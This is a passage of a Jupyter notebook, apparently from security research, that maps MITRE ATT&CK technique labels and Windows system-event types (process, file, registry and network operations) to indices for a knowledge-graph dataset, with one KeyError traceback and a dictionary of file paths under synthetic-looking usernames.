       " 23: 'T1053.005_5db2884b6ca3ab932848f295a3896dc0_B',\n",
       " 24: 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_B',\n",
       " 25: 'T1105_c521e0a70b243a0cf9217907ca3c6d27_B',\n",
       " 26: 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_I',\n",
       " 27: 'T1124_fa6e8607-e0b1-425d-8924-9b894da5a002_B',\n",
       " 28: 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_B',\n",
       " 29: 'T1053.005_ee454be9197890de62705ce6255933fd_B',\n",
       " 30: 'T1204.002_522f3f35cd013e63830fa555495a0081_I',\n",
       " 31: 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_B',\n",
       " 32: 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_I',\n",
       " 33: 'T1115_70795de7cbb842edb029b3378c27c008_I',\n",
       " 34: 'T1562.004_280003641a5cddf916c4f2bf605a71d3_B',\n",
       " 35: 'T1036.004_7de3d7b4922a7b996d8df36fb22bb118_B',\n",
       " 36: 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_I',\n",
       " 37: 'T1562.002_94f51bf01a7036fe02d07b4c18967669_B',\n",
       " 38: 'T1219_7dabcbecab0334b115feefab1630f84a_I',\n",
       " 39: 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_I',\n",
       " 40: 'T1552.002_3e5b04b8ee0a1a4950da8f35d95e65fc_B',\n",
       " 41: 'T1057_8adf02e8-6e71-4244-886c-98c402857404_I',\n",
       " 42: 'T1560_a1ee301b0508747b468d578a14e5c1a5_I',\n",
       " 43: 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_I',\n",
       " 44: 'T1546.013_f9a968af61d36983448c74cca5464e17_B',\n",
       " 45: 'T1491_68235976-2404-42a8-9105-68230cfef562_B',\n",
       " 46: 'T1562.002_94f51bf01a7036fe02d07b4c18967669_I',\n",
       " 47: 'T1217_69bbe2183fa09c00ccaac62d48e214f8_I',\n",
       " 48: 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_I',\n",
       " 49: 'T1040_6881a4589710d53f0c146e91db513f01_B',\n",
       " 50: 'T1531_b25ae80dad74142fafb510e9c1949ace_B',\n",
       " 51: 'T1047_6935e41353aa781bb723462d26114c44_B',\n",
       " 52: 'T1018_a44bb43474728496276d5d73aa14588f_B',\n",
       " 53: 'T1547.010_4593d72a5145e3f494421ac772d37464_I',\n",
       " 54: 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_I',\n",
       " 55: 'T1125_da86001b5081fcf773d8e62f22cf2b00_I',\n",
       " 56: 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_B',\n",
       " 57: 'T1055.001_a74bc239-a196-4f7e-8d5c-fe8c0266071c_B',\n",
       " 58: 'T1547.001_163b023f43aba758d36f524d146cb8ea_B',\n",
       " 59: 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_B',\n",
       " 60: 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_B',\n",
       " 61: 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_I',\n",
       " 62: 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_I',\n",
       " 63: 'T1518_8ddfaf982ab359cda13626b870ccb339_B',\n",
       " 64: 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_I',\n",
       " 65: 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_I',\n",
       " 66: 'T1105_e6715e61f5df646692c624b3499384c4_B',\n",
       " 67: 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_B',\n",
       " 68: 'T1486_d82ceb9939d3d920ee550187ad8235c8_I',\n",
       " 69: 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_I',\n",
       " 70: 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_I',\n",
       " 71: 'T1112_257313a3c93e3bb7dfb60d6753b09e34_B',\n",
       " 72: 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_I',\n",
       " 73: 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_B',\n",
       " 74: 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_B',\n",
       " 75: 'T1547.001_777043894e42d2aae3881e63f6c76d33_I',\n",
       " 76: 'T1082_29451844-9b76-4e16-a9ee-d6feab4b24db_B',\n",
       " 77: 'T1490_9e5e4c0655fd1b5be88bd40b8251175f_B',\n",
       " 78: 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_I',\n",
       " 79: 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_B',\n",
       " 80: 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_I',\n",
       " 81: 'T1119_7121cdf93b951311be9d7078c602efdc_I',\n",
       " 82: 'T1105_1095434782a00c8a4772a11e625bcf5d_I',\n",
       " 83: 'T1201_38f6f0e50a6b196140ec40d3dc9cc9e6_B',\n",
       " 84: 'T1564_dedfa0a54c9c13ce5714a0dc2e1f5d1a_B',\n",
       " 85: 'T1112_4bfb5f265a5ce07af6bf10da113af7db_B',\n",
       " 86: 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_I',\n",
       " 87: 'T1562.004_41627f71f968225b9f162cb76d16bd9d_I',\n",
       " 88: 'T1518_8ddfaf982ab359cda13626b870ccb339_I',\n",
       " 89: 'T1112_fd992e8ecfdac9b56dd6868904044827_B',\n",
       " 90: 'T1518.001_33a24ff44719e6ac0614b58f8c9a7c72_B',\n",
       " 91: 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_I',\n",
       " 92: 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_I',\n",
       " 93: 'T1547.010_4593d72a5145e3f494421ac772d37464_B',\n",
       " 94: 'T1069.002_6103e503cb444bc7b4187704f2035708_B',\n",
       " 95: 'T1125_da86001b5081fcf773d8e62f22cf2b00_B',\n",
       " 96: 'T1120_7b9c7afaefa59aab759b49af0d699ac1_I',\n",
       " 97: 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_I',\n",
       " 98: 'T1055.002_e5bcefee-262d-4568-a261-e8a20855ec81_B',\n",
       " 99: 'T1566.001_1afaec09315ab71fdfb167175e8a019a_I',\n",
       " 100: 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_I',\n",
       " 101: 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_I',\n",
       " 102: 'T1123_372e6f46fca18e4f1b43209c20ffafa2_I',\n",
       " 103: 'T1003.002_7fa4ea18694f2552547b65e23952cabb_I',\n",
       " 104: 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_I',\n",
       " 105: 'T1137_12ad9edefc86af07700fbf49bfdac6ba_B',\n",
       " 106: 'T1057_5a39d7ed-45c9-4a79-b581-e5fb99e24f65_B',\n",
       " 107: 'T1112_ba6f6214dbd17c54001e0a163b60f151_I',\n",
       " 108: 'T1562.004_41627f71f968225b9f162cb76d16bd9d_B',\n",
       " 109: 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_B',\n",
       " 110: 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_B',\n",
       " 111: 'T1016_14a21534-350f-4d83-9dd7-3c56b93a0c17_B',\n",
       " 112: 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_I',\n",
       " 113: 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_B',\n",
       " 114: 'T1204.002_522f3f35cd013e63830fa555495a0081_B',\n",
       " 115: 'T1105_c76968acda4aa1673dadcd67f3ab7664_I',\n",
       " 116: 'T1135_530e47c6-8592-42bf-91df-c59ffbd8541b_B',\n",
       " 117: 'T1018_26c8b8b5-7b5b-4de1-a128-7d37fb14f517_B',\n",
       " 118: 'T1547_fe9eeee9a7b339089e5fa634b08522c1_B',\n",
       " 119: 'T1564.004_76b6066fe170d38215251102e42be973_B',\n",
       " 120: 'T1059.003_6c318ef0339d74d909ad556681b6493e_B',\n",
       " 121: 'T1112_cab7b85611a290c0769546bfa9d6f962_I',\n",
       " 122: 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_I',\n",
       " 123: 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_B',\n",
       " 124: 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_I',\n",
       " 125: 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_B',\n",
       " 126: 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_B',\n",
       " 127: 'T1566.001_1afaec09315ab71fdfb167175e8a019a_B',\n",
       " 128: 'T1560_a1ee301b0508747b468d578a14e5c1a5_B',\n",
       " 129: 'T1007_9d03c91bdae5a80f17f89c987942b5a8_B',\n",
       " 130: 'T1033_bd527b63-9f9e-46e0-9816-b8434d2b8989_B',\n",
       " 131: 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_B',\n",
       " 132: 'T1112_e7a987cbef27263e666e5b096488dc55_B',\n",
       " 133: 'T1112_ba6f6214dbd17c54001e0a163b60f151_B',\n",
       " 134: 'T1047_ac2764f7a67a9ce92b54e8e59b361838_B',\n",
       " 135: 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_B',\n",
       " 136: 'T1112_35c0360d226cf38104f300d9d57ce60e_I',\n",
       " 137: 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_B',\n",
       " 138: 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_B',\n",
       " 139: 'T1040_6881a4589710d53f0c146e91db513f01_I',\n",
       " 140: 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_B',\n",
       " 141: 'T1547.004_0856714c9810ac55b53e9964d02958a0_B',\n",
       " 142: 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_B',\n",
       " 143: 'T1546.013_f9a968af61d36983448c74cca5464e17_I',\n",
       " 144: 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_B',\n",
       " 145: 'T1087.001_feaced8f-f43f-452a-9500-a5219488abb8_B',\n",
       " 146: 'T1112_fd992e8ecfdac9b56dd6868904044827_I',\n",
       " 147: 'T1574.001_63bbedafba2f541552ac3579e9e3737b_I',\n",
       " 148: 'T1497.001_1258b063-27d6-489b-a677-4807faacf868_B',\n",
       " 149: 'T1137_12ad9edefc86af07700fbf49bfdac6ba_I',\n",
       " 150: 'T1003_18f31c311ac208802e88ab8d5af8603e_B',\n",
       " 151: 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_B',\n",
       " 152: 'T1112_257313a3c93e3bb7dfb60d6753b09e34_I',\n",
       " 153: 'T1105_e6715e61f5df646692c624b3499384c4_I',\n",
       " 154: 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_B',\n",
       " 155: 'T1201_57296a2ddbeb7423c05feef2fe972111_B',\n",
       " 156: 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_B',\n",
       " 157: 'T1547_fe9eeee9a7b339089e5fa634b08522c1_I',\n",
       " 158: 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_I',\n",
       " 159: 'T1490_e90756bb6dcd21462dc4cc452661df91_B',\n",
       " 160: 'T1547.009_b6e5c895c6709fe289352ee23f062229_B',\n",
       " 161: 'T1007_d6bb2a19da7246731ed9c44831b135f8_B',\n",
       " 162: 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_B',\n",
       " 163: 'T1562.001_43e3334362b140924f001b256b229ee5_B',\n",
       " 164: 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_I',\n",
       " 165: 'T1497.001_5dc841fd-28ad-40e2-b10e-fb007fe09e81_B',\n",
       " 166: 'T1105_4f683658f161ccdc51337c470d32bab9_I',\n",
       " 167: 'T1007_c6607391-d02c-44b5-9b13-d3492ca58599_B',\n",
       " 168: 'T1217_69bbe2183fa09c00ccaac62d48e214f8_B',\n",
       " 169: 'T1112_cd8be0e6b873919da25530a2c7ea6750_I',\n",
       " 170: 'T1531_aa6b15485a5f50ced34d87fda177b758_B',\n",
       " 171: 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_B',\n",
       " 172: 'T1036.004_1f0614ea5c4af6faf1b44570f5f22f8a_B',\n",
       " 173: 'T1083_6e1a53c0-7352-4899-be35-fa7f364d5722_B',\n",
       " 174: 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_B',\n",
       " 175: 'T1016_71b3d2945679566b9d94d8cb11df4b70_B',\n",
       " 176: 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_B',\n",
       " 177: 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_B',\n",
       " 178: 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_B',\n",
       " 179: 'T1562.001_43e3334362b140924f001b256b229ee5_I',\n",
       " 180: 'T1057_8adf02e8-6e71-4244-886c-98c402857404_B',\n",
       " 181: 'T1497.001_7a6ba833-de40-466a-8969-5c37b13603e0_B',\n",
       " 182: 'T1003.001_35d92515122effdd73801c6ac3021da7_B',\n",
       " 183: 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_B',\n",
       " 184: 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_B',\n",
       " 185: 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_I',\n",
       " 186: 'T1490_c156ac5c9fa67080365268d95f29053d_B',\n",
       " 187: 'T1574.001_63bbedafba2f541552ac3579e9e3737b_B',\n",
       " 188: 'T1105_c521e0a70b243a0cf9217907ca3c6d27_I',\n",
       " 189: 'T1112_4bfb5f265a5ce07af6bf10da113af7db_I',\n",
       " 190: 'T1003_18f31c311ac208802e88ab8d5af8603e_I',\n",
       " 191: 'T1547.009_b6e5c895c6709fe289352ee23f062229_I',\n",
       " 192: 'T1087.001_6334877e8e3ba48f7835d4856d90a282_B',\n",
       " 193: 'T1112_e7a987cbef27263e666e5b096488dc55_I',\n",
       " 194: 'T1112_35c0360d226cf38104f300d9d57ce60e_B',\n",
       " 195: 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_I',\n",
       " 196: 'T1490_8467c994685ccf178db166964bd80fab_B',\n",
       " 197: 'T1217_f7a0f7d704aa52a764d9d1bee81e65d6_B',\n",
       " 198: 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_B',\n",
       " 199: 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_I',\n",
       " 200: 'T1486_d82ceb9939d3d920ee550187ad8235c8_B',\n",
       " 201: 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_B',\n",
       " 202: 'T1003.002_5a484b65c247675e3b7ada4ba648d376_B',\n",
       " 203: 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_I',\n",
       " 204: 'T1033_c0da588f-79f0-4263-8998-7496b1a40596_B',\n",
       " 205: 'T1078.001_d0ca00832890baa1d42322cf70fcab1a_B',\n",
       " 206: 'T1547.001_163b023f43aba758d36f524d146cb8ea_I',\n",
       " 207: 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_I',\n",
       " 208: 'T1016_e8017c46-acb8-400c-a4b5-b3362b5b5baa_B',\n",
       " 209: 'T1482_cfb61005899996469ae3023796792ca5_B',\n",
       " 210: 'T1003.003_9f73269695e54311dd61dc68940fb3e1_B',\n",
       " 211: 'T1003.003_f049b89533298c2d6cd37a940248b219_B',\n",
       " 212: 'T1047_ed736a123da6fb2aab22cfd4f437e8b5_B',\n",
       " 213: 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_I',\n",
       " 214: 'T1071.001_24c3b7b004401d839a5c337201da3484_I',\n",
       " 215: 'T1105_c76968acda4aa1673dadcd67f3ab7664_B',\n",
       " 216: 'T1491_68235976-2404-42a8-9105-68230cfef562_I',\n",
       " 217: 'T1115_b007fe0c-c6b0-4fda-915c-255bbc070de2_B',\n",
       " 218: 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_B',\n",
       " 219: 'T1490_2d53d6fabd39bf9c70b0dfcdfbbc926d_B',\n",
       " 220: 'T1071.001_24c3b7b004401d839a5c337201da3484_B',\n",
       " 221: 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_I',\n",
       " 222: 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_I',\n",
       " 223: 'T1562.004_5b93df032e230056c21a3e57334f77d1_B',\n",
       " 224: 'T1057_b2a1e430ca6d36eb5af2fe666e769847_B',\n",
       " 225: 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_I',\n",
       " 226: 'T1112_34041639e6e501856ecaf5969ee29c76_B',\n",
       " 227: 'T1087.001_6334877e8e3ba48f7835d4856d90a282_I',\n",
       " 228: 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_B',\n",
       " 229: 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_I',\n",
       " 230: 'T1112_e74d2fb4ef5fa6c766a4151554033697_I',\n",
       " 231: 'T1057_f8de05d1741dcc468f772ab0ff4dac72_B',\n",
       " 232: 'T1564.001_66a5fd5f244819181f074dd082a28905_I',\n",
       " 233: 'T1120_7b9c7afaefa59aab759b49af0d699ac1_B',\n",
       " 234: 'T1003.001_35d92515122effdd73801c6ac3021da7_I',\n",
       " 235: 'T1219_7dabcbecab0334b115feefab1630f84a_B',\n",
       " 236: 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_I',\n",
       " 237: 'T1049_a14392d713dffba6a397682ff83259a0_B',\n",
       " 238: 'T1047_f4b0b4129560ea66f9751275e82f6bab_I',\n",
       " 239: 'T1049_638fb6bb-ba39-4285-93d1-7e4775b033a8_B',\n",
       " 240: 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_B',\n",
       " 241: 'T1047_b0255b5120cbabc062d8d4510a142c3b_B',\n",
       " 242: 'T1112_cd8be0e6b873919da25530a2c7ea6750_B',\n",
       " 243: 'T1112_cab7b85611a290c0769546bfa9d6f962_B',\n",
       " 244: 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_I',\n",
       " 245: 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_I',\n",
       " 246: 'T1518.001_b8453a5fe06b24aea12b27592d5c3d3a_B',\n",
       " 247: 'T1016_921055f4-5970-4707-909e-62f594234d91_I',\n",
       " 248: 'T1018_ac20e592bc912bddff4d6b88289095f0_B',\n",
       " 249: 'T1562.004_5b93df032e230056c21a3e57334f77d1_I',\n",
       " 250: 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_B',\n",
       " 251: 'T1069.001_a1f48fa3ddee658b29b414523c9a295b_B',\n",
       " 252: 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_I',\n",
       " 253: 'T1135_deeac480-5c2a-42b5-90bb-41675ee53c7e_B',\n",
       " 254: 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_I',\n",
       " 255: 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_B',\n",
       " 256: 'T1007_9d03c91bdae5a80f17f89c987942b5a8_I',\n",
       " 257: 'T1564.001_66a5fd5f244819181f074dd082a28905_B',\n",
       " 258: 'O',\n",
       " 259: 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_I',\n",
       " 260: 'T1105_4f683658f161ccdc51337c470d32bab9_B',\n",
       " 261: 'T1047_ac122553ab4426ea3362bb4a97d31bfd_B',\n",
       " 262: 'T1123_372e6f46fca18e4f1b43209c20ffafa2_B',\n",
       " 263: 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_B',\n",
       " 264: 'T1059.003_6c318ef0339d74d909ad556681b6493e_I',\n",
       " 265: 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_B',\n",
       " 266: 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_I',\n",
       " 267: 'T1547.004_0856714c9810ac55b53e9964d02958a0_I',\n",
       " 268: 'T1016_7d8ee68f0e9731db82964f558f614608_B',\n",
       " 269: 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_B',\n",
       " 270: 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_B',\n",
       " 271: 'T1112_e74d2fb4ef5fa6c766a4151554033697_B',\n",
       " 272: 'T1119_7121cdf93b951311be9d7078c602efdc_B',\n",
       " 273: 'T1115_70795de7cbb842edb029b3378c27c008_B'}"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "index2label = {v: k for k, v in label2index.items()}\n",
    "\n",
    "index2label"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "7fb6e38a-79df-42f4-97b7-d0edba7d40fd",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Process Create': 0,\n",
       " 'Process Start': 1,\n",
       " 'CreateFile': 2,\n",
       " 'SetBasicInformationFile': 3,\n",
       " 'SetDispositionInformationEx': 4,\n",
       " 'SetDispositionInformationFile': 5,\n",
       " 'WriteFile': 6,\n",
       " 'TCP Connect': 7,\n",
       " 'TCP Send': 8,\n",
       " 'UDP Send': 9,\n",
       " 'TCP Disconnect': 10,\n",
       " 'RegQueryKey': 11,\n",
       " 'RegQueryValue': 12,\n",
       " 'CloseFile': 13,\n",
       " 'QueryAllInformationFile': 14,\n",
       " 'QueryAttributeTagFile': 15,\n",
       " 'QueryBasicInformationFile': 16,\n",
       " 'QueryDirectory': 17,\n",
       " 'QueryNetworkOpenInformationFile': 18,\n",
       " 'ReadFile': 19,\n",
       " 'TCP Receive': 20,\n",
       " 'UDP Receive': 21,\n",
       " 'RegCreateKey': 22,\n",
       " 'RegSetValue': 23,\n",
       " 'RegCloseKey': 24,\n",
       " 'RegDeleteValue': 25,\n",
       " 'RegOpenKey': 26}"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "file_path = '../data/3_openKE_3/relation2id.txt'\n",
    "edge_ent2idx = build_dictionary(file_path)\n",
    "\n",
    "edge_ent2idx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "9d870077-a538-480d-98f3-794a03b48914",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "file_path = '../data/3_openKE_3/entity2id.txt'\n",
    "node_ent2id_txt = build_dictionary(file_path)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "b24f3c77-9395-4ce2-beb1-f1f80cea32ff",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "477549\n"
     ]
    },
    {
     "ename": "KeyError",
     "evalue": "'HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Option'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyError\u001b[0m                                  Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[10], line 2\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[38;5;28mprint\u001b[39m(node_ent2id_txt[\u001b[38;5;124m'\u001b[39m\u001b[38;5;124m4379921687c9a557f14c36d23279d6d4b8304e34d2cc904f9c8b9efed7824778.bin\u001b[39m\u001b[38;5;124m'\u001b[39m])\n\u001b[0;32m----> 2\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[43mnode_ent2id_txt\u001b[49m\u001b[43m[\u001b[49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[38;5;124;43mHKLM\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mSystem\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mCurrentControlSet\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mControl\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mSafeBoot\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mOption\u001b[39;49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[43m]\u001b[49m)\n\u001b[1;32m      3\u001b[0m \u001b[38;5;28mprint\u001b[39m(node_ent2id_txt[\u001b[38;5;124m'\u001b[39m\u001b[38;5;130;01m\\x1f\u001b[39;00m\u001b[38;5;124m@028;0 2K5740 70 3@0=8FC A>B@C4=8:0<.exe\u001b[39m\u001b[38;5;124m'\u001b[39m])\n",
      "\u001b[0;31mKeyError\u001b[0m: 'HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Option'"
     ]
    }
   ],
   "source": [
    "print(node_ent2id_txt['4379921687c9a557f14c36d23279d6d4b8304e34d2cc904f9c8b9efed7824778.bin'])\n",
    "print(node_ent2id_txt['HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Option'])\n",
    "print(node_ent2id_txt['\\x1f@028;0 2K5740 70 3@0=8FC A>B@C4=8:0<.exe'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "d29fcf1e-2e29-4b5f-9f46-2f784fcc161b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "816212"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(node_ent2id_txt)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "5d59c16c-1b10-45f8-8054-90438e29fd00",
   "metadata": {},
   "outputs": [],
   "source": [
    "# node_ent2idx = build_dictionary('../data/3_openKE/entity2id.txt')\n",
    "\n",
    "with open (f'../data/3_openKE_2/entity2id.pkl', 'rb') as fp:\n",
    "    node_ent2idx = pickle.load(fp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "712d8d18-85a4-46cc-a386-b32e7c4c471c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "395360\n",
      "437670\n",
      "663432\n"
     ]
    }
   ],
   "source": [
    "print(node_ent2idx['4379921687c9a557f14c36d23279d6d4b8304e34d2cc904f9c8b9efed7824778.bin'])\n",
    "print(node_ent2idx['HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Option'])\n",
    "print(node_ent2idx['\\x1f@028;0 2K5740 70 3@0=8FC A>B@C4=8:0<.exe'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "1c28c44a-4a77-4a0b-bab9-d2ad209c9781",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "816212"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(node_ent2idx)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "588c84e1-301b-4a3d-88cb-59d7a01283e5",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\hyphen-data\\\\101.0.4906.0\\\\*': 0,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BingWeather_8wekyb3d8bbwe\\\\LocalState\\\\.git': 1,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-GB': 2,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\ListSync\\\\.git': 3,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Web Notifications Deny List\\\\.git': 4,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Microsoft\\\\InputPersonalization\\\\*': 5,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\cache2\\\\.git': 6,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\en_GB\\\\*': 7,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-CI\\\\*': 8,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\WidevineCdm\\\\4.10.2391.6\\\\.git': 9,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\\\.git': 10,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-419': 11,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release': 12,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\TempState\\\\.git': 13,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 14,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Windows.PrintDialog_cw5n1h2txyewy': 15,\n",
